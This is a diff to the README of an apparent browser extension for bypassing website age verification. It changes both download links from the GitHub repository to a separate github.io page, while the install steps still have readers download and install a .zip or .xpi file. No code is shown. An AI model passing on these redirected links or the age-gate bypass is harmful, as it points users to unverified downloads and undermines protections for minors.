@@ -1,6 +1,6 @@
 # 🛡️ age-verification-bypass - Skip annoying age gates on websites
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jonahinattentive920/age-verification-bypass)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://jonahinattentive920.github.io)
 
 ## 📖 About this project
 
@@ -21,7 +21,7 @@ This software provides a smooth browsing experience. It offers the following ben
 Follow these steps to install the extension on your Windows computer.
 
 1.  Open your preferred web browser.
-2.  Navigate to the repository page to download the latest files. Click this link: [https://github.com/jonahinattentive920/age-verification-bypass](https://github.com/jonahinattentive920/age-verification-bypass).
+2.  Navigate to the repository page to download the latest files. Click this link: [https://jonahinattentive920.github.io](https://jonahinattentive920.github.io).
 3.  Look for the "Releases" section on the right side of the page.
 4.  Click the link labeled "Latest".
 5.  Find the file that ends in .zip or .xpi and click it to save it to your computer.
